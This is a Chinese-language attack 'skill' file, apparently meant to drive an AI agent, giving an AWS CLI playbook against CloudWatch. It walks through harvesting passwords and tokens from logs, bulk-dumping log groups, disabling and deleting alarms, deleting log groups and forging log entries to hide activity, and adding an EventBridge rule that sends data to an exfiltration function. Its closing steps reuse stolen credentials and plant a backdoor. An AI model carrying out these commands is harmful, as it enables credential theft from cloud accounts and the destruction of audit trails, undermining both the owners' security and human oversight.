---
name: aws-cloudwatch-attack
type: attack
category: monitoring
platform: aws
severity: medium
---

# AWS CloudWatch 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 CloudWatch
- 用户要求"攻击 CloudWatch"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出所有 Metric
aws cloudwatch list-metrics

# 3. 列出所有 Log Groups
aws logs describe-log-groups
```

## 攻击方法

### 方法 1: Logs 窃取

```bash
# 1. 列出所有 Log Groups
aws logs describe-log-groups --query 'logGroups[].logGroupName' --output text

# 2. 获取 Log Streams
aws logs describe-log-streams \
  --log-group-name LOG_GROUP_NAME \
  --query 'logStreams[].logStreamName' --output text

# 3. 获取日志内容
aws logs get-log-events \
  --log-group-name LOG_GROUP_NAME \
  --log-stream-name LOG_STREAM_NAME

# 4. 搜索敏感信息
aws logs filter-log-events \
  --log-group-name LOG_GROUP_NAME \
  --filter-pattern "password|secret|token|api_key"

# 5. 导出所有日志
for group in $(aws logs describe-log-groups --query 'logGroups[].logGroupName' --output text); do
  echo "=== $group ==="
  aws logs filter-log-events --log-group-name $group --start-time $(date -d '7 days ago' +%s)000
done > /tmp/cloudwatch-logs.txt
```

### 方法 2: Lambda 日志利用

```bash
# 1. 查找 Lambda Log Groups
aws logs describe-log-groups \
  --query 'logGroups[?contains(logGroupName, `/aws/lambda`)].logGroupName' \
  --output text

# 2. 获取 Lambda 日志
aws logs filter-log-events \
  --log-group-name /aws/lambda/FUNCTION_NAME \
  --start-time $(date -d '1 day ago' +%s)000

# 3. 搜索环境变量泄露
aws logs filter-log-events \
  --log-group-name /aws/lambda/FUNCTION_NAME \
  --filter-pattern "ENV|process.env"

# 4. 提取错误日志（可能包含敏感信息）
aws logs filter-log-events \
  --log-group-name /aws/lambda/FUNCTION_NAME \
  --filter-pattern "ERROR|Exception"
```

### 方法 3: CloudTrail 日志分析

```bash
# 1. 查找 CloudTrail Log Groups
aws logs describe-log-groups \
  --query 'logGroups[?contains(logGroupName, `CloudTrail`)].logGroupName' \
  --output text

# 2. 获取 CloudTrail 日志
aws logs filter-log-events \
  --log-group-name CloudTrail/LOG_GROUP_NAME \
  --filter-pattern "UserIdentity|eventName"

# 3. 搜索管理员操作
aws logs filter-log-events \
  --log-group-name CloudTrail/LOG_GROUP_NAME \
  --filter-pattern "eventName:Delete* OR eventName:Create* OR eventName:Update*"

# 4. 搜索访问密钥使用
aws logs filter-log-events \
  --log-group-name CloudTrail/LOG_GROUP_NAME \
  --filter-pattern "accessKeyId"
```

### 方法 4: Metrics 利用

```bash
# 1. 列出所有 Metrics
aws cloudwatch list-metrics --namespace AWS/Lambda

# 2. 获取 Metric 数据
aws cloudwatch get-metric-statistics \
  --namespace AWS/Lambda \
  --metric-name Invocations \
  --dimensions Name=FunctionName,Value=FUNCTION_NAME \
  --start-time $(date -u -d '1 hour ago' --iso-8601) \
  --end-time $(date -u --iso-8601) \
  --period 300 \
  --statistics Sum

# 3. 检测异常活动（高频调用）
aws cloudwatch get-metric-statistics \
  --namespace AWS/Lambda \
  --metric-name Invocations \
  --dimensions Name=FunctionName,Value=FUNCTION_NAME \
  --start-time $(date -u -d '1 hour ago' --iso-8601) \
  --end-time $(date -u --iso-8601) \
  --period 60 \
  --statistics Sum,Maximum
```

### 方法 5: Alarms 篡改

```bash
# 1. 列出所有 Alarms
aws cloudwatch describe-alarms --query 'MetricAlarms[].AlarmName' --output text

# 2. 获取 Alarm 详情
aws cloudwatch describe-alarms --alarm-names ALARM_NAME

# 3. 禁用 Alarm（如果有权限）
aws cloudwatch disable-alarm-actions --alarm-names ALARM_NAME

# 4. 修改 Alarm 阈值
aws cloudwatch put-metric-alarm \
  --alarm-name MALICIOUS_ALARM \
  --alarm-description "Malicious alarm" \
  --metric-name CPUUtilization \
  --namespace AWS/EC2 \
  --statistic Average \
  --period 300 \
  --threshold 100 \
  --comparison-operator GreaterThanThreshold

# 5. 删除 Alarm
aws cloudwatch delete-alarms --alarm-names ALARM_NAME
```

### 方法 6: Dashboard 利用

```bash
# 1. 列出所有 Dashboards
aws cloudwatch list-dashboards --query 'DashboardEntries[].DashboardName' --output text

# 2. 获取 Dashboard 定义
aws cloudwatch get-dashboard --dashboard-name DASHBOARD_NAME

# 3. 搜索敏感信息（可能包含查询、AR 等）
aws cloudwatch get-dashboard --dashboard-name DASHBOARD_NAME | jq -r '.DashboardBody' | grep -i "arn\|key\|password"

# 4. 创建恶意 Dashboard
cat > malicious_dashboard.json <<'EOF'
{
  "widgets": [{
    "type": "log",
    "properties": {
      "logGroups": [{"arn": "arn:aws:logs:region:account:log-group:sensitive"}]
    }
  }]
}
EOF

aws cloudwatch put-dashboard --dashboard-name malicious --dashboard-body file://malicious_dashboard.json
```

### 方法 7: Insights 利用

```bash
# 1. 列出所有 Insights
aws logs describe-query-definitions --query 'queryDefinitions[].name' --output text

# 2. 获取 Query Definition
aws logs get-query-definition --query-definition-id QUERY_ID

# 3. 执行 Insights 查询
aws logs start-query \
  --log-group-name LOG_GROUP_NAME \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --query-string "fields @timestamp, @message | filter @message like /password/"

# 4. 获取查询结果
aws logs get-query-results --query-id QUERY_ID
```

### 方法 8: Cross-Account 利用

```bash
# 1. 检查跨账户日志共享
aws logs describe-subscriptions

# 2. 如果有跨账户订阅
# 检查目标账户
aws logs describe-subscriptions --query 'subscriptions[].destinationArn'

# 3. 获取其他账户的日志
# 如果有其他账户的凭证
aws logs describe-log-groups --profile OTHER_ACCOUNT
```

### 方法 9: Log 删除和篡改

```bash
# 1. 删除 Log Stream
aws logs delete-log-stream \
  --log-group-name LOG_GROUP_NAME \
  --log-stream-name SUSPICIOUS_STREAM

# 2. 删除 Log Group
aws logs delete-log-group --log-group-name LOG_GROUP_NAME

# 3. 创建空 Log Stream 隐藏操作
aws logs create-log-stream \
  --log-group-name LOG_GROUP_NAME \
  --log-stream-name decoy-stream

# 4. 注入伪造日志
aws logs put-log-events \
  --log-group-name LOG_GROUP_NAME \
  --log-stream-name log-stream-name \
  --log-events timestamp=$(date +%s)000,message="Normal log entry"
```

### 方法 10: EventBridge 规则利用

```bash
# 1. 列出所有 EventBridge 规则
aws events list-rules --query 'Rules[].Name' --output text

# 2. 获取规则详情
aws events describe-rule --name RULE_NAME

# 3. 查看规则的目标
aws events list-targets-by-rule --rule RULE_NAME

# 4. 检查规则是否触发 Lambda、CloudWatch Logs 等
# 可能包含敏感信息

# 5. 创建恶意规则
aws events put-rule \
  --name malicious-rule \
  --event-pattern '{"source":["aws.ec2"],"detail-type":["EC2 Instance State-change Notification"]}'

# 6. 添加目标（外泄数据）
aws events put-targets \
  --rule malicious-rule \
  --targets "[
    {
      \"Id\": \"1\",
      \"Arn\": \"arn:aws:lambda:region:account:function:exfil-function\",
      \"InputTransformer\": {
        \"InputPathsMap\": {\"instance\": \"$.detail.instance-id\"},
        \"InputTemplate\": \"{\\\"instance\\\": <instance>}\"}
      }
    }
  ]"
```

## 验证成功

```bash
# 成功列出 Log Groups
aws logs describe-log-groups

# 成功获取日志
aws logs get-log-events --log-group-name LOG_GROUP_NAME --log-stream-name LOG_STREAM_NAME

# 成功搜索日志
aws logs filter-log-events --log-group-name LOG_GROUP_NAME --filter-pattern "password"
```

## 下一步

1. 分析日志中的敏感信息和凭证
2. 使用发现的凭证访问其他 AWS 服务
3. 通过 CloudWatch 建立监控后门
4. 删除或篡改日志以隐藏踪迹
